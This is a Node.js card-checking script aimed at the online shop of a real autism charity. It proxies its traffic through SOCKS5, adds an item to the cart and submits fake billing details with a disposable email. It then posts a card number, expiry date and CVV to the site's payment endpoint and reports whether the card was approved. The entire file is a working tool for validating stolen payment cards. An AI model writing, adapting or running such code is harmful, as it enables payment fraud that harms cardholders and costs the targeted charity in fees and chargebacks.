const Agent = require("socks5-https-client/lib/Agent");
const request = require("request-promise");
const helper = require("./helper");
const fs = require("fs").promises;

class Process {
  constructor(cc, month, year, cvv) {
    return (async () => {
      const { HOSTNAME, PORT, USERNAME, PASSWORD } = helper.getProxy();
      this.HOSTNAME = HOSTNAME;
      this.PORT = PORT;
      this.USERNAME = USERNAME;
      this.PASSWORD = PASSWORD;

      const { firstName, lastName, email } = await helper.getAddress();
      this.firstName = firstName;
      this.lastName = lastName;
      this.email = email;

      this.cookieJar = request.jar();

      this.cc = cc;
      this.month = month;
      this.year = year.length < 4 ? year : year.substr(2, 2);
      this.cvv = cvv;

      return this; // when done
    })();
  }

  setOpts(url, additionalOpts) {
    const options = {
      uri: url,
      jar: this.cookieJar,
      followAllRedirects: true,
      strictSSL: true,
      agentClass: Agent,
      simple: false,
      agentOptions: {
        socksHost: this.HOSTNAME, // Defaults to 'localhost'.
        socksPort: this.PORT, // Defaults to 1080.

        // Optional credentials
        socksUsername: this.USERNAME,
        socksPassword: this.PASSWORD,
      },
    };

    if (additionalOpts) {
      for (let key in additionalOpts) {
        options[key] = additionalOpts[key];
      }
    }

    // console.log(options);

    return options;
  }

  async preview(response) {
    fs.writeFile("index.html", response);
    console.log("Wrote to response index.html");
  }

  async addCart() {
    const URL =
      "https://autismqld.com.au/icart/action/ajax_add_to_cart?act=ajax_add_to_cart&product_id=662&quantity=1&selected_options=%7B%7D&inventory_code=";

    const options = this.setOpts(URL, { method: "GET" });

    await request(options);
  }

  async saveDetails() {
    const URL = "https://autismqld.com.au/icart/action/checkout_save_details";
    const POST_DATA =
      "register=guest&start_billing_details=start_billing_details&billing_company_name=Select&billing_first_name=David&billing_last_name=Smith&billing_email=clrhgywq%40sharklasers.com&billing_phone=8028791223&billing_address=1755+Poppy+Dr&billing_address2=Rocklin&billing_country=UNITED+STATES&billing_country_code=US&billing_city=Rocklin&billing_state=California&billing_postcode=95650&end_billing_details=end_billing_details&start_delivery_details=start_delivery_details&del_same=yes&delivery_first_name=&delivery_last_name=&delivery_email=null&delivery_phone=&delivery_address=&delivery_address2=&delivery_country=AUSTRALIA&delivery_country_code=AU&delivery_city=&delivery_city=&delivery_state=&delivery_postcode=&end_delivery_details=end_delivery_details&mailing_list_subscribe=0&submit=+++++Continue+%C2%BB+++++";

    const options = this.setOpts(URL, {
      method: "POST",
      body: POST_DATA,
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Host: "autismqld.com.au",
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
      },
    });

    const response = await request(options);

    return helper.getStr2(response, '"order_id" value="', '"');
  }

  async checkCard(order_id) {
    const URL = "https://autismqld.com.au/icart/action/payway_api_checkout";
    const POST_DATA = `order_id=${order_id}&comments=&cardHolderName=${this.firstName}+${this.lastName}&cardNumber=${this.cc}&cardVerificationNumber=${this.cvv}&cardExpiryMonth=${this.month}&cardExpiryYear=${this.year}&submit=Submit+Payment`;
    const options = this.setOpts(URL, {
      body: POST_DATA,
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
      },
    });

    // console.log(POST_DATA);

    const response = await request(options);

    if (response.includes("Order Complete"))
      return { success: true, message: "Approved" };

    return {
      success: false,
      message: helper.getStr2(response, "Payment Error!", "\n").trim(),
    };
  }

  async execute() {
    await this.addCart();
    const order_id = await this.saveDetails();
    const { success, message } = await this.checkCard(order_id);

    return { success, message };
  }
}

(async () => {
  const process = await new Process("5161820000005137", "03", "2024", "337");

  const response = await process.execute();

  console.log(response);
})();
